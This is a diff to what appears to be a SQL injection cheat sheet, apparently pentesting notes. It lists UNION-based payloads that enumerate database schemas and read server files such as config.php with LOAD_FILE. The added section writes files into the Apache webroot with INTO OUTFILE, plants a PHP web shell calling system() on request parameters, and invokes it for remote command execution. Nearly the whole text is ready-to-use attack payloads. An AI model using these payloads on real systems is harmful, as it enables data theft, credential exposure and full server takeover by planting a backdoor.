@@ -9,7 +9,7 @@
 
 #### Step 1: Schema/Database check
 
-     cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
+     ' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
 
 #### Step 2: Tables check
 
@@ -52,3 +52,22 @@ We know that the current page is search.php. The default Apache webroot is /var/
 
       ' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
       ' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4-- -
+### Write Files Using Union SQL Injection or RCE Using SQL Injection
+Example
+
+      ' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
+Web Shell Upload:
+
+      ' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
+      
+Basic PHP Web Shell:
+
+      <?php system($_REQUEST[cmd]); ?>
+OR 
+      <?php system($_GET['cmd']); ?>
+ 
+### For RCE , Call Upload Web shell 
+
+Example :
+          url/upload_file.php?parameter=commnad
+          http://cyberteach360/shell.php?cmd=id
